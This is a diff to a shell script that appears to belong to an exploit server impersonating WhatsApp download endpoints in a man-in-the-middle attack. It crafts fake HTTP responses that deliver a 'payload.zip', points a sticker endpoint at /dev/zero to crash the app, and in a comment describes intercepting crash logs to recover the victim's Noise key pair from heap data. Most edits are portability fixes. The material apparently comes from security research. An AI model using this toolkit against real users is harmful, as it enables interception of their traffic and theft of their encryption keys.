@@ -10,7 +10,7 @@ create_files()
     cat > "downloadable?category=manifest&locale=en&existing_id=RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA" << EOF
 HTTP/1.0 200 OK
 Server: BaseHTTP/0.6 Python/3.9.1
-Date: $(date -R)
+Date: $(date +"%a, %d %b %Y %H:%M:%S %z")
 Connection: keep-alive
 content-disposition: attachment;filename=manifest.json
 content-type: application/json
@@ -129,11 +129,11 @@ EOF
     cat > "downloadable?category=filter" << EOF
 HTTP/1.0 200 OK
 Server: BaseHTTP/0.6 Python/3.9.1
-Date: $(date -R)
+Date: $(date +"%a, %d %b %Y %H:%M:%S %z")
 Connection: keep-alive
 content-disposition: attachment;filename=filter_en_YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ.zip
 content-type: application/zip
-content-length: $(stat -c "%s" payload.zip)
+content-length: $(wc -c < payload.zip | sed s/[[:space:]]*//g)
 idhash: YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ
 
 EOF
@@ -150,7 +150,7 @@ EOF
     # crashlogs.whatsapp.net, which we can also MitM. The victim's Noise key
     # pair can then be recovered by examining the heap data.
     #
-    ln -s /dev/zero "sticker?cat=all&lg=en-US&country=GR&ver=2"
+    ln -sf /dev/zero "sticker?cat=all&lg=en-US&country=GR&ver=2"
 }
 
 
@@ -224,6 +224,14 @@ main()
     if [ -z "$SECRETS" ]; then
         echo "SECRETS not set!"
         return
+    fi
+
+    #
+    # For testing purposes, one might want to run the server without providing
+    # a "payload.zip". It's ok, just use "/dev/null" instead.
+    #
+    if [ ! -f payload.zip ]; then
+        ln -sf /dev/null payload.zip
     fi
 
     #
